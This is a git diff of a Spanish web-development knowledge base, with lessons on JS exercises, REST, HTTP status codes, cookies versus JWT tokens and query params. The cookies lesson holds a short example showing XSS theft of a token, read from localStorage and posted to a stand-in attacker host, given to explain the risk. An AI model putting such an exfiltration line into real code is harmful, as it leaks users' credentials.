@@ -266,7 +266,7 @@ const KNOWLEDGE_BASE: Concept[] = [
     },
     {
       "type": "text",
-      "value": "Tu tarea es actuar como el desarrollador senior y **refactorizar** este código. El código original funciona, pero tiene malas prácticas: muta datos, usa concatenación de strings, promesas encadenadas antiguas y no maneja errores correctamente."
+      "value": "Tu tarea es actuar como el desarrollador  y **refactorizar** este código. El código original funciona, pero tiene malas prácticas: muta datos, usa concatenación de strings, promesas encadenadas antiguas y no maneja errores correctamente."
     },
     {
       "type": "text",
@@ -347,6 +347,83 @@ const KNOWLEDGE_BASE: Concept[] = [
   ]
 },
 {
+  "id": "ejercicios-fundamentos-js-progresivos",
+  "title": "Ejercicio práctico: Lógica",
+  "shortDescription": "Una batería de 7 ejercicios diseñados para escalar desde la sintaxis básica hasta la asincronía compleja y manipulación de datos avanzada.",
+  "keyConcept": "La única forma de interiorizar la sintaxis y la lógica de programación es enfrentándose a la **hoja en blanco**. Estos ejercicios no tienen solución adjunta; el objetivo es que investigues y construyas tu propia implementación.",
+  "language": "React",
+  "conceptType": "practica",
+  "tags": [
+    "Fundamentos",
+    "Lógica",
+    "Algoritmos"
+  ],
+  "difficulty": "Intermedio",
+  "content": [
+    {
+      "type": "text",
+      "value": "A continuación, se presentan 7 ejercicios ordenados estrictamente por dificultad. Copia los enunciados en tu editor de código favorito y resuélvelos uno a uno. No avances al siguiente hasta que el anterior funcione correctamente."
+    },
+    {
+      "type": "text",
+      "value": "### Manipulación de Strings y Arrays"
+    },
+    {
+      "type": "code",
+      "value": "/* \nEJERCICIO 1: Detector de Palíndromos\nCrea una función que determine si una cadena de texto es un palíndromo.\nDebe ignorar espacios y mayúsculas/minúsculas.\nEjemplo: \"Ana lava lana\" -> true\n*/\n\nconst esPalindromo = (texto) => {\n  // Tu código aquí\n};"
+    },
+    {
+      "type": "text",
+      "value": "### Lógica de Arrays"
+    },
+    {
+      "type": "code",
+      "value": "/* \nEJERCICIO 2: Encontrar el Número Faltante\nRecibes un array de números del 0 al n, pero falta UNO.\nEl array no está ordenado.\nEncuentra qué número falta.\nEjemplo: [3, 0, 1] (falta el 2) -> retorna 2\n*/\n\nconst encontrarFaltante = (numeros) => {\n  // Tu código aquí\n};"
+    },
+    {
+      "type": "text",
+      "value": "### Objetos y Frecuencias"
+    },
+    {
+      "type": "code",
+      "value": "/* \nEJERCICIO 3: Contador de Caracteres\nEscribe una función que tome un string y devuelva un objeto con la frecuencia de cada carácter.\nEjemplo: \"hola\" -> { h: 1, o: 1, l: 1, a: 1 }\nEjemplo: \"banana\" -> { b: 1, a: 3, n: 2 }\n*/\n\nconst contarCaracteres = (texto) => {\n  // Tu código aquí\n};"
+    },
+    {
+      "type": "text",
+      "value": "### Funciones de primer orden (Map, Filter)"
+    },
+    {
+      "type": "code",
+      "value": "/* \nEJERCICIO 4: Procesador de Pedidos\nRecibes un array de objetos (pedidos). Cada objeto tiene { id, precio, estado }.\nDebes retornar un array con los IDs de los pedidos que:\n1. Tengan estado \"completado\".\n2. Su precio sea mayor a 100.\nUsa .filter() y .map().\n*/\n\nconst obtenerIdsGrandesPedidos = (pedidos) => {\n  // Tu código aquí\n};"
+    },
+    {
+      "type": "text",
+      "value": "### Reduce y Transformación de Datos"
+    },
+    {
+      "type": "code",
+      "value": "/* \nEJERCICIO 5: Agrupar por Categoría\nDado un array de productos: [{ nombre: 'Manzana', categoria: 'Fruta' }, { nombre: 'Lechuga', categoria: 'Verdura' }...]\nUsa .reduce() para devolver un objeto donde las claves sean las categorías y los valores sean arrays con los nombres de los productos.\nResultado esperado: { Fruta: ['Manzana', ...], Verdura: ['Lechuga', ...] }\n*/\n\nconst agruparPorCategoria = (productos) => {\n  // Tu código aquí\n};"
+    },
+    {
+      "type": "text",
+      "value": "### Promesas"
+    },
+    {
+      "type": "code",
+      "value": "/* \nEJERCICIO 6: Semáforo Asíncrono\nCrea una función 'esperar' que retorne una Promesa que se resuelva después de 'ms' milisegundos.\nLuego, crea una función asíncrona 'cicloSemaforo' que imprima:\n1. \"Verde\" (espera 2 segundos)\n2. \"Amarillo\" (espera 1 segundo)\n3. \"Rojo\" (espera 3 segundos)\nDebe usar await y la función 'esperar'.\n*/\n\nconst esperar = (ms) => { /* ... */ };\n\nconst cicloSemaforo = async () => {\n  // Tu código aquí\n};"
+    },
+    {
+      "type": "text",
+      "value": "### Fetching de datos"
+    },
+    {
+      "type": "code",
+      "value": "/* \nEJERCICIO 7: Fetching en Paralelo\nCrea una función 'obtenerUsuarios' que reciba un array de IDs: [1, 2, 3].\nDebe realizar peticiones a 'https://jsonplaceholder.typicode.com/users/{id}' para cada ID.\nIMPORTANTE:\n1. Las peticiones deben lanzarse en paralelo (Promise.all).\n2. Debes devolver un array solo con los nombres (name) de los usuarios.\n3. Gestiona errores: si una falla, el proceso no debe detenerse (Promise.allSettled o try/catch individual).\n*/\n\nconst obtenerUsuarios = async (ids) => {\n  // Tu código aquí\n};"
+    }
+  ]
+},
+
+{
   "id": "fundamentos-js-http-api-fetch",
   "title": "Protocolo HTTP, APIs y Fetch: La Comunicación de Datos",
   "shortDescription": "Dominio del intercambio de datos en la web: verbos HTTP, códigos de estado y consumo robusto de APIs mediante Fetch.",
@@ -362,23 +439,59 @@ const KNOWLEDGE_BASE: Concept[] = [
   "content": [
     {
       "type": "text",
-      "value": "Para que una aplicación React sea útil, necesita datos. Estos datos no viven en el navegador del usuario, sino en servidores remotos. Para acceder a ellos, utilizamos el protocolo que mueve la web: **HTTP** (Hypertext Transfer Protocol)."
+      "value": "Cuando desarrollamos en React, pasamos gran parte del tiempo consumiendo datos. Esos datos suelen venir de una **API REST**. Aunque usamos el término a diario, a menudo se malinterpreta. REST (Representational State Transfer) fue definido por Roy Fielding en el año 2000 y cambió la forma en que construimos sistemas distribuidos."
     },
     {
       "type": "text",
-      "value": "El modelo mental es una conversación: el Cliente (tu navegador/app React) hace una **Petición** (Request) y el Servidor responde con una **Respuesta** (Response). Esta comunicación no es libre; sigue reglas estrictas."
+      "value": "Lo primero que debes entender como desarrollador es que REST **no es un protocolo** (como HTTP o FTP), ni un formato de archivo (como JSON). Es un **estilo arquitectónico**. Es un conjunto de 'reglas' o restricciones que, si las sigues, hacen que tu API sea escalable, modificable y fiable."
+    },
+    {
+      "type": "text",
+      "value": "El concepto central de REST es el **Recurso**. En una arquitectura antigua (RPC o SOAP), pensábamos en 'acciones' o 'procedimientos' (ej: `getUser`, `calculatePrice`). En REST, pensamos en **sustantivos** o entidades."
+    },
+    {
+      "type": "text",
+      "value": "Todo es un recurso: un Usuario, un Producto, un Comentario. Cada recurso debe ser identificable de forma única a través de una **URI** (Uniform Resource Identifier), que usualmente es la URL del endpoint."
     },
     {
       "type": "text",
       "value": ""
     },
     {
-      "type": "text",
-      "value": "Primero, debemos entender los **Métodos HTTP** (o verbos). Indican la *intención* de la operación sobre un recurso. En una arquitectura REST, los más comunes son:"
+      "type": "code",
+      "value": "// ❌ MALA PRÁCTICA (Estilo RPC - Basado en verbos)\n// POST /api/crearUsuario\n// GET /api/obtenerProductos\n// POST /api/borrarItem?id=5\n\n// ✅ BUENA PRÁCTICA (Estilo REST - Basado en recursos)\n// POST /api/usuarios\n// GET /api/productos\n// DELETE /api/items/5"
     },
     {
-      "type": "code",
-      "value": "// GET:    Pedir datos (Lectura). No modifica nada en el servidor.\n// POST:   Enviar datos nuevos (Creación). Ej: Registro de usuario.\n// PUT:    Reemplazar un recurso existente completo (Edición total).\n// PATCH:  Modificar parcialmente un recurso (Edición parcial).\n// DELETE: Eliminar un recurso."
+      "type": "text",
+      "value": "Si las URLs son los sustantivos, ¿dónde están los verbos? REST delega las acciones al propio protocolo **HTTP**. Utilizamos los **Métodos HTTP** estándar para definir qué queremos hacer con ese recurso. Esto se conoce como 'interfaz uniforme'."
+    },
+    {
+      "type": "text",
+      "value": "**GET**: Solicitar la representación de un recurso. Es una operación de solo lectura. Debe ser **segura** (no modifica datos) e **idempotente** (llamarla 100 veces devuelve lo mismo y no tiene efectos secundarios.)"
+    },
+    {
+      "type": "text",
+      "value": "**POST**: Crear un recurso nuevo. Generalmente enviamos los datos en el cuerpo (body) de la petición. No es idempotente (si envías la misma petición POST 5 veces, crearás 5 recursos iguales)."
+    },
+    {
+      "type": "text",
+      "value": "**PUT vs PATCH**: Ambos sirven para actualizar, pero hay una diferencia semántica crucial. **PUT** implica un reemplazo total (si no envías un campo, este se borra). **PATCH** implica una modificación parcial (solo actualizas los campos que envías)."
+    },
+    {
+      "type": "text",
+      "value": "**DELETE**: Eliminar un recurso identificado por su URI."
+    },
+    {
+      "type": "text",
+      "value": "La característica técnica más definitoria de REST es que es **Stateless** (Sin Estado). Esto significa que el servidor no guarda contexto de la sesión del usuario entre peticiones."
+    },
+    {
+      "type": "text",
+      "value": "Cada petición HTTP (Request) debe contener **toda** la información necesaria para que el servidor la entienda y procese. Esto se entenderá mejor cuando veamos los tokens y la autenticación de usuario."
+    },
+    {
+      "type": "text",
+      "value": "Otro pilar es la **representación**. El recurso es un concepto abstracto en el servidor (una fila en una base de datos SQL). Lo que el servidor nos envía no es la base de datos, sino una 'representación' de ese recurso en un formato que podamos entender, hoy en día casi exclusivamente **JSON**."
     },
     {
       "type": "text",
@@ -386,7 +499,43 @@ const KNOWLEDGE_BASE: Concept[] = [
     },
     {
       "type": "text",
-      "value": "* **2xx (Éxito):** Todo bien. (200 OK, 201 Created).\n* **3xx (Redirección):** El recurso se ha movido.\n* **4xx (Error del Cliente):** Tú (el frontend) hiciste algo mal. (400 Bad Request, 401 Unauthorized, 404 Not Found).\n* **5xx (Error del Servidor):** El backend falló. (500 Internal Server Error)."
+      "value": "**2xx (Éxito):** Todo bien. (200 OK, 201 Created).\n**3xx (Redirección):** El recurso se ha movido.\n**4xx (Error del Cliente):** Tú (el frontend) hiciste algo mal. (400 Bad Request, 401 Unauthorized, 404 Not Found).\n**5xx (Error del Servidor):** El backend falló. (500 Internal Server Error)."
+    },
+    {
+      "type": "text",
+      "value": "Una API REST bien diseñada utiliza los **Códigos de Estado HTTP** para comunicar el resultado. No basta con devolver un JSON con `{ \"error\": \"fallo\" }` y un status 200 OK, sino que es necesario indicar el **código de respuesta adecuado** al resultado de la petición."
+    },
+    {
+      "type": "code",
+      "value": "// Guía rápida de códigos REST:\n\n// 200 OK: Todo bien (GET, PUT, PATCH).\n// 201 Created: Recurso creado con éxito (POST).\n// 204 No Content: Éxito, pero no hay nada que devolver (común en DELETE).\n\n// 400 Bad Request: El cliente envió datos mal formados.\n// 401 Unauthorized: Falta autenticación (Token).\n// 403 Forbidden: Tienes token, pero no permisos para esto.\n// 404 Not Found: El recurso (URI) no existe.\n\n// 500 Internal Server Error: El código del servidor falló (bug)."
+    },
+    {
+      "type": "text",
+      "value": "Hablemos de la **jerarquía y anidamiento**. A veces los recursos tienen relaciones padre-hijo. REST modela esto a través de la URL."
+    },
+    {
+      "type": "code",
+      "value": "// Obtener los comentarios del post con ID 42\nGET /api/posts/42/comments\n\n// Obtener el detalle del comentario 5 dentro del post 42\nGET /api/posts/42/comments/5"
+    },
+    {
+      "type": "text",
+      "value": "Sin embargo, como regla de diseño, evita anidar más de dos niveles (`/posts/1/comments/5/author/details`...). Si necesitas tanta profundidad, es probable que ese recurso merezca su propio endpoint raíz o debas usar Query Params para filtrar."
+    },
+    {
+      "type": "text",
+      "value": "Finalmente, el **versionado**. Las APIs cambian. Para no romper las aplicaciones de tus usuarios (Breaking Changes), es estándar prefijar tus rutas con la versión."
+    },
+    {
+      "type": "text",
+      "value": "Usar `/api/v1/usuarios` te permite lanzar `/api/v2/usuarios` en el futuro con una estructura de datos completamente diferente, manteniendo la v1 activa para clientes antiguos hasta que migren."
+    },
+    {
+      "type": "text",
+      "value": "Para que una aplicación React sea útil, necesita datos. Estos datos no viven en el navegador del usuario, sino en servidores remotos. Para acceder a ellos, utilizamos el protocolo que mueve la web: **HTTP** (Hypertext Transfer Protocol)."
+    },
+    {
+      "type": "text",
+      "value": "El modelo mental es una conversación: el Cliente (tu navegador/app React) hace una **Petición** (Request) y el Servidor responde con una **Respuesta** (Response). Esta comunicación no es libre; sigue reglas estrictas."
     },
     {
       "type": "text",
@@ -450,7 +599,7 @@ const KNOWLEDGE_BASE: Concept[] = [
     },
     {
       "type": "text",
-      "value": "Finalmente, hablemos de la **Autenticación**. La mayoría de APIs privadas requieren que te identifiques. Esto no suele hacerse en la URL, sino mediante un header específico, usualmente `Authorization` con un token Bearer."
+      "value": "Finalmente, hablemos de la **autenticación**. La mayoría de APIs privadas requieren que te identifiques. Esto no suele hacerse en la URL, sino mediante un header específico, usualmente `Authorization` con un token Bearer."
     },
     {
       "type": "code",
@@ -563,6 +712,342 @@ const KNOWLEDGE_BASE: Concept[] = [
     {
       "type": "text",
       "value": "Este patrón es la base de toda comunicación robusta con un backend en React."
+    }
+  ]
+},
+{
+  "id": "fundamentos-seguridad-cookies-tokens",
+  "title": "Autenticación y Persistencia: Cookies vs Tokens",
+  "shortDescription": "Desglose técnico de los mecanismos de almacenamiento y transporte de identidad en la web moderna, con énfasis en seguridad y buenas prácticas.",
+  "keyConcept": "Es crucial distinguir entre el **Token** (el dato que demuestra la identidad) y la **Cookie** (el mecanismo de transporte y almacenamiento). La arquitectura más segura combina ambos.",
+  "language": "React",
+  "conceptType": "apuntes",
+  "tags": [
+    "Seguridad",
+    "Fundamentos",
+    "Backend"
+  ],
+  "difficulty": "Intermedio",
+  "content": [
+    {
+      "type": "text",
+      "value": "Para entender la autenticación en la web, primero debemos recordar una verdad incómoda del protocolo HTTP: es **stateless** (sin estado). El servidor no tiene memoria. Cada petición es independiente y aislada de la anterior."
+    },
+    {
+      "type": "text",
+      "value": "Si te logueas en una aplicación, y luego navegas a tu perfil, el servidor necesita una forma de saber que esa segunda petición viene de la misma persona que se acaba de loguear. Aquí entran los mecanismos de persistencia de identidad."
+    },
+    {
+      "type": "text",
+      "value": "Empecemos por las **Cookies**. Una cookie no es más que un pequeño fragmento de texto (clave=valor) que el servidor envía al navegador. El navegador guarda este texto y, lo más importante, **lo reenvía automáticamente** al servidor en cada petición subsiguiente al mismo dominio."
+    },
+    {
+      "type": "text",
+      "value": "Fueron inventadas precisamente para dotar de 'memoria' a la web. Se usan para mantener sesiones de usuario, guardar preferencias (como el idioma) o realizar rastreo (tracking) para publicidad."
+    },
+    {
+      "type": "code",
+      "value": "// Ejemplo de cabecera HTTP de respuesta del servidor\n// El servidor 'planta' la cookie en tu navegador\nSet-Cookie: session_id=xyz123; Expires=Wed, 21 Oct 2025 07:28:00 GMT; Secure; HttpOnly"
+    },
+    {
+      "type": "text",
+      "value": "Analicemos las 'flags' o atributos de seguridad de una Cookie, ya que son vitales para un desarrollador :"
+    },
+    {
+      "type": "text",
+      "value": "1. **`HttpOnly`**: La cookie no puede ser accedida desde JavaScript (es decir, `document.cookie` no la verá). Esto protege contra ataques XSS (Cross-Site Scripting)."
+    },
+    {
+      "type": "text",
+      "value": "2. **`Secure`**: La cookie solo se envía si la conexión es HTTPS."
+    },
+    {
+      "type": "text",
+      "value": "3. **`SameSite`**: Controla si la cookie se envía en peticiones que vienen de otros sitios web. Es la defensa principal contra ataques CSRF (Cross-Site Request Forgery)."
+    },
+    {
+      "type": "text",
+      "value": "Ahora, hablemos de los **Tokens**. Un token es un artefacto digital, generalmente una cadena de texto codificada, que contiene información (claims) sobre la identidad del usuario y sus permisos."
+    },
+    {
+      "type": "text",
+      "value": "El estándar de facto hoy en día es el **JWT (JSON Web Token)**. Un JWT es auto-contenido: lleva la información dentro de sí mismo y está firmado digitalmente por el servidor para evitar falsificaciones."
+    },
+    {
+      "type": "code",
+      "value": "// Estructura visual de un JWT (Header.Payload.Signature)\n// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikp1YW4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+    },
+    {
+      "type": "text",
+      "value": "A diferencia de las cookies (que son un mecanismo de transporte), el token es el **dato** en sí. Los tokens suelen ser 'stateless' para el servidor: no necesita consultar una base de datos de sesiones para validarlo, solo verificar su firma matemática."
+    },
+    {
+      "type": "text",
+      "value": "El uso más común de un token es enviarlo manualmente en la cabecera `Authorization` de cada petición `fetch`."
+    },
+    {
+      "type": "code",
+      "value": "fetch('https://api.miweb.com/perfil', {\n  headers: {\n    'Authorization': 'Bearer <AQUI_VA_TU_TOKEN_JWT>'\n  }\n});"
+    },
+    {
+      "type": "text",
+      "value": "Aquí surge el gran debate de seguridad en el Frontend: **¿Dónde guardo el Token?**"
+    },
+    {
+      "type": "text",
+      "value": "Muchos tutoriales básicos te dirán que lo guardes en **`localStorage`**. Esto es cómodo, pero **peligroso**. Cualquier script malicioso que logre ejecutarse en tu página (por ejemplo, a través de una librería de terceros comprometida o un ataque XSS) puede leer todo tu `localStorage` y robar la identidad del usuario."
+    },
+    {
+      "type": "code",
+      "value": "// Ataque XSS simple si guardas tokens en localStorage\nconst tokenRobado = localStorage.getItem('access_token');\nfetch('https://hacker.com/robar', { body: tokenRobado });"
+    },
+    {
+      "type": "text",
+      "value": "Entonces, ¿cuál es la **Buena Práctica **? La arquitectura híbrida de **Access Token + Refresh Token**."
+    },
+    {
+      "type": "text",
+      "value": "Esta estrategia consiste en usar dos tokens. 1. **Access Token**: De vida muy corta (ej: 15 minutos). Se guarda en **memoria** de JavaScript (una variable dentro de un closure o contexto). Si refrescas la página, se pierde."
+    },
+    {
+      "type": "text",
+      "value": "2. **Refresh Token**: De vida larga (ej: 7 días). Se utiliza única y exclusivamente para pedir nuevos Access Tokens cuando estos caducan."
+    },
+    {
+      "type": "text",
+      "value": "El truco de seguridad es: **El Refresh Token se guarda en una Cookie `HttpOnly`**."
+    },
+    {
+      "type": "text",
+      "value": "Al estar en una cookie `HttpOnly`, JavaScript no puede leerla, por lo que un ataque XSS no puede robar el Refresh Token. El atacante podría robar el Access Token de la memoria, pero como caduca en 15 minutos, el daño es limitado."
+    },
+    {
+      "type": "text",
+      "value": "### Resumen del procedimiento de autenticación:"
+    },
+    {
+      "type": "text",
+      "value": "1. El usuario hace 'Login'. El servidor responde con un Access Token (en el JSON) y planta una Cookie `HttpOnly` con el Refresh Token."
+    },
+    {
+      "type": "text",
+      "value": "2. El Frontend **guarda el Access Token** en memoria y lo usa para las peticiones API."
+    },
+    {
+      "type": "text",
+      "value": "3. Si la API devuelve error 401 (Token Expirado), el Frontend llama automáticamente al endpoint `/refresh-token`."
+    },
+    {
+      "type": "text",
+      "value": "4. El endpoint `/refresh-token` lee la cookie (el navegador la envía sola), valida el Refresh Token y devuelve un nuevo Access Token."
+    },
+    {
+      "type": "text",
+      "value": "5. El Frontend reintenta la petición original con el nuevo token. Si no hay token (porque ha expirado por ejemplo), se deniega la petición y se **cierra la sesión**."
+    }
+  ]
+},
+{
+  "id": "fundamentos-seguridad-stateless-jwt",
+  "title": "Arquitectura Stateless y Seguridad con JWT",
+  "shortDescription": "Desglose profundo de la naturaleza sin estado de HTTP, la diferencia crítica entre autenticación y autorización, y la anatomía de un JSON Web Token.",
+  "keyConcept": "En una arquitectura **Stateless**, el servidor no guarda memoria de la sesión. El **JWT** resuelve esto permitiendo que el cliente transporte su propia identidad y permisos de forma **firmada y verificable**.",
+  "language": "React",
+  "conceptType": "apuntes",
+  "tags": [
+    "Seguridad",
+    "Arquitectura",
+    "Backend"
+  ],
+  "difficulty": "Intermedio",
+  "content": [
+    {
+      "type": "text",
+      "value": "Para comprender cómo aseguramos las aplicaciones modernas, primero debemos entender el terreno de juego: el protocolo HTTP. HTTP se define como un protocolo **Stateless** (Sin Estado)."
+    },
+    {
+      "type": "text",
+      "value": "¿Qué significa esto? Imagina que el servidor es un empleado de ventanilla con amnesia total. Cada vez que te acercas a la ventanilla (haces una petición), para él es la primera vez que te ve. No importa si hace 5 segundos le diste tu DNI; si vuelves a pedir algo, te pedirá el DNI de nuevo."
+    },
+    {
+      "type": "text",
+      "value": "En el pasado, resolvíamos esto con **sesiones en el servidor**. El servidor te daba un número (session ID) y guardaba en su memoria: 'El número 55 es Juan'. Esto funciona bien en apps pequeñas, pero escala mal. Si tienes 5 millones de usuarios, necesitas mucha memoria RAM en el servidor para recordar a todos (y no está precisamente barata)."
+    },
+    {
+      "type": "text",
+      "value": "La arquitectura moderna prefiere el enfoque **stateless**. Aquí, el servidor no guarda nada. En su lugar, cuando te logueas, te entrega una credencial especial (**el token**) y te dice: 'Guarda esto. Cada vez que quieras algo, enséñame esta credencial. Yo no te recuerdo, pero confío en la credencial'."
+    },
+    {
+      "type": "text",
+      "value": "Antes de entrar en el token, distingamos dos conceptos que se confunden a menudo: **Autenticación** (AuthN) y **Autorización** (AuthZ)."
+    },
+    {
+      "type": "text",
+      "value": "La **Autenticación** responde a la pregunta: **¿Quién eres?**. Es el proceso de verificar tu identidad (generalmente con usuario y contraseña). Es como enseñar tu DNI en la entrada de un edificio."
+    },
+    {
+      "type": "text",
+      "value": "La **Autorización** responde a la pregunta: **¿Qué puedes hacer?**. Una vez sabemos quién eres, determinamos si tienes permiso para borrar un usuario o ver un informe financiero. Es como la tarjeta de acceso que te abre unas puertas sí y otras no."
+    },
+    {
+      "type": "text",
+      "value": "El estándar de oro para manejar esto en aplicaciones Stateless es el **JWT (JSON Web Token)**. No es una cookie, ni un string aleatorio; es un estándar abierto (RFC 7519) para transmitir información de forma segura entre partes."
+    },
+    {
+      "type": "text",
+      "value": "Si miras un JWT, verás una cadena larga de caracteres aparentemente aleatorios, separados por dos puntos `.`. Tiene esta pinta: `aaaaa.bbbbb.ccccc`. Cada parte tiene una función vital."
+    },
+    {
+      "type": "text",
+      "value": ""
+    },
+    {
+      "type": "text",
+      "value": "1. **Header (Cabecera)**: Es la primera parte (antes del primer punto). Es un JSON codificado en Base64Url que indica qué algoritmo criptográfico se usó para firmar el token (usualmente HS256 o RS256) y el tipo de token (JWT)."
+    },
+    {
+      "type": "code",
+      "value": "// Header decodificado\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}"
+    },
+    {
+      "type": "text",
+      "value": "2. **Payload (Carga Útil)**: La segunda parte. Aquí es donde viajan los datos. Contiene las **Claims** (afirmaciones). Hay claims reservadas (como `exp` para expiración, `sub` para el sujeto/ID) y claims personalizadas (como `rol: admin`)."
+    },
+    {
+      "type": "code",
+      "value": "// Payload decodificado\n{\n  \"sub\": \"1234567890\",\n  \"name\": \"Carlos Dev\",\n  \"admin\": true,\n  \"exp\": 1516239022 // Fecha de caducidad en formato Unix Timestamp\n}"
+    },
+    {
+      "type": "text",
+      "value": "⚠️ **ADVERTENCIA**: El Payload está codificado en Base64, **NO ENCRIPTADO**. Cualquiera que capture el token puede decodificarlo y leer los datos (hay webs como jwt.io para esto). **NUNCA** guardes contraseñas o información sensible en el Payload del JWT."
+    },
+    {
+      "type": "text",
+      "value": "3. **Signature (Firma)**: La tercera parte. Aquí reside la magia de la seguridad. El servidor toma el Header codificado, el Payload codificado y una **Clave Secreta** (que solo el servidor conoce), y los mezcla usando el algoritmo especificado."
+    },
+    {
+      "type": "code",
+      "value": "// Pseudocódigo de cómo se genera la firma\nconst firma = HMACSHA256(\n  base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\n  SECRETO_DEL_SERVIDOR\n);"
+    },
+    {
+      "type": "text",
+      "value": "¿Por qué es esto seguro? Porque si un hacker intercepta el token e intenta cambiar el Payload (ej: cambiar `admin: false` a `admin: true`), al llegar al servidor, este recalculará la firma con los datos modificados. Como el hacker no tiene la **Clave Secreta**, la firma no coincidirá y el servidor rechazará la petición."
+    },
+    {
+      "type": "text",
+      "value": "El flujo de uso en el Frontend (React) es el siguiente:"
+    },
+    {
+      "type": "text",
+      "value": "1. El usuario envía usuario/contraseña (`POST /login`).\n2. El servidor valida y genera el JWT firmado.\n3. El cliente recibe el JWT y lo guarda (en memoria o cookie segura).\n4. En cada petición futura, el cliente envía el JWT en la cabecera `Authorization`."
+    },
+    {
+      "type": "code",
+      "value": "const respuesta = await fetch('https://api.miweb.com/datos-privados', {\n  method: 'GET',\n  headers: {\n    // El esquema estándar es 'Bearer <token>'\n    'Authorization': `Bearer ${tokenJWT}`\n  }\n});"
+    },
+    {
+      "type": "text",
+      "value": "Una vez que el servidor recibe el token, verifica la firma. Si es válida y el token no ha expirado (`exp`), extrae el ID del usuario del Payload y procesa la solicitud. Todo esto sin consultar la base de datos para ver 'sesiones activas'."
+    },
+    {
+      "type": "text",
+      "value": "En resumen: El JWT es como un billete de banco infalsificable. Cualquiera puede leer su valor, pero solo la fábrica de moneda (el servidor con su clave secreta) puede emitirlos válidos. Esto permite una arquitectura Stateless y escalable."
+    }
+  ]
+},
+{
+  "id": "fundamentos-http-query-params",
+  "title": "Query Params: Consultas Avanzadas en APIs REST",
+  "shortDescription": "Guía técnica sobre la estructura, construcción y manipulación profesional de parámetros de consulta en URLs utilizando JavaScript nativo.",
+  "keyConcept": "Los **Query Parameters** son la herramienta estándar para filtrar, ordenar y paginar recursos en una API REST, y su manipulación correcta requiere el uso de la API **URLSearchParams** para evitar errores de codificación.",
+  "language": "React",
+  "conceptType": "apuntes",
+  "tags": [
+    "Fundamentos",
+    "Backend",
+    "Frontend"
+  ],
+  "difficulty": "Intermedio",
+  "content": [
+    {
+      "type": "text",
+      "value": "En la comunicación con APIs REST, a menudo no basta con pedir un recurso (ej: 'dame todos los usuarios'). Necesitamos ser más específicos: 'dame los usuarios activos, ordenados por nombre y solo la página 2'. Para esta especificidad nacieron los **Query Params** (Parámetros de Consulta)."
+    },
+    {
+      "type": "text",
+      "value": "Técnicamente, un Query Param es un conjunto de pares clave-valor que se añaden al final de una URL. Su función no es identificar un recurso único (para eso están los Path Params, como `/users/15`), sino **modificar** la respuesta que el servidor nos devolverá sobre una colección de recursos."
+    },
+    {
+      "type": "text",
+      "value": "La anatomía de una URL con parámetros es estricta. Todo comienza con el signo de interrogación `?`, que marca el final de la ruta y el inicio de la consulta. A partir de ahí, los pares se separan con el ampersand `&`."
+    },
+    {
+      "type": "text",
+      "value": ""
+    },
+    {
+      "type": "code",
+      "value": "// Estructura básica\n// https://api.ejemplo.com/recurso ? clave1=valor1 & clave2=valor2\n\n// Ejemplo real: Buscar productos de la categoría 'tech' ordenados por precio\nconst url = 'https://api.tienda.com/productos?categoria=tech&sort=precio_asc';"
+    },
+    {
+      "type": "text",
+      "value": "Un error muy común en desarrolladores junior es construir estas cadenas mediante concatenación de strings manual. Esto es propenso a errores, difícil de leer y peligroso si los valores contienen caracteres especiales (como espacios, `&` o `?`)."
+    },
+    {
+      "type": "code",
+      "value": "// ❌ MALA PRÁCTICA: Concatenación manual\nconst busqueda = \"telas & hilos\"; // El '&' romperá la URL\nconst url = \"/api/buscar?q=\" + busqueda; \n// Resultado: /api/buscar?q=telas & hilos \n// El servidor entenderá: q=\"telas\" y una clave nueva \"hilos\" sin valor."
+    },
+    {
+      "type": "text",
+      "value": "Para solucionar esto profesionalmente, JavaScript moderno nos proporciona la interfaz **`URLSearchParams`**. Esta API se encarga de construir la cadena de texto, codificar caracteres especiales (URL Encoding) y gestionar los separadores automáticamente."
+    },
+    {
+      "type": "text",
+      "value": "La **codificación de URL** (URL Encoding) transforma caracteres \"peligrosos\" en un formato seguro usando el símbolo `%`. Por ejemplo, un espacio se convierte en `%20`. `URLSearchParams` hace esto por ti de forma transparente."
+    },
+    {
+      "type": "code",
+      "value": "// ✅ BUENA PRÁCTICA: Uso de URLSearchParams\nconst params = new URLSearchParams();\n\n// Añadimos valores uno a uno\nparams.append('categoria', 'hogar');\nparams.append('busqueda', 'telas & hilos'); // Se codificará automáticamente\nparams.append('pagina', 1);\n\nconsole.log(params.toString());\n// Resultado: \"categoria=hogar&busqueda=telas+%26+hilos&pagina=1\""
+    },
+    {
+      "type": "text",
+      "value": "También podemos inicializar `URLSearchParams` directamente con un objeto de JavaScript o un array de arrays, lo cual es mucho más limpio cuando tenemos varios parámetros fijos."
+    },
+    {
+      "type": "code",
+      "value": "const filtros = {\n  status: 'activo',\n  limit: 20,\n  offset: 0\n};\n\nconst params = new URLSearchParams(filtros);\nconst urlFinal = `/api/usuarios?${params.toString()}`;"
+    },
+    {
+      "type": "text",
+      "value": "Ahora integremos esto con `fetch`. Cuando construimos una función reutilizable para peticiones GET, lo ideal es que acepte un objeto de parámetros opcional y lo transforme antes de llamar al servidor."
+    },
+    {
+      "type": "code",
+      "value": "const obtenerProductos = async (filtros = {}) => {\n  // Creamos la instancia de params basada en el objeto recibido\n  const queryParams = new URLSearchParams(filtros);\n  \n  // Convertimos a string (ej: \"color=rojo&talla=M\")\n  const queryString = queryParams.toString();\n  \n  // Construimos la URL completa. \n  // Si el string está vacío, la URL termina en '?' (lo cual es válido pero ignorado)\n  const response = await fetch(`https://api.tienda.com/v1/productos?${queryString}`);\n  \n  return response.json();\n};\n\n// Uso:\nobtenerProductos({ color: 'rojo', stock: true });"
+    },
+    {
+      "type": "text",
+      "value": "Un caso especial es el manejo de **Arrays en Query Params**. No existe un estándar único sobre cómo enviar una lista de valores (ej: filtrar por color rojo Y azul). Depende de cómo esté configurado tu Backend."
+    },
+    {
+      "type": "text",
+      "value": "Existen principalmente dos convenciones: repetir la clave (`color=rojo&color=azul`) o separar por comas (`color=rojo,azul`). `URLSearchParams` soporta nativamente la repetición de claves mediante `append`."
+    },
+    {
+      "type": "code",
